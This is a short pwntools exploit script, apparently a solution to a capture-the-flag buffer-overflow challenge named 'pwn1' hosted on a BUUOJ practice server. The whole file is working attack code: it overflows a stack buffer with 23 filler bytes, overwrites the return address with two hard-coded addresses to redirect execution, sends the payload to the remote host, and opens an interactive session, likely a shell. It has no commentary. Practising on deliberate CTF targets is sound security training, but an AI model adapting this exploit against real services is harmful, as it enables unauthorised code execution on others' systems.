from pwn import *

#io = process("./pwn1")
io = remote('node3.buuoj.cn', 28212)
#io.recv()
payload = b'a' * 23 + p64(0x401198) + p64(0x401186)
io.sendline(payload)

io.interactive()
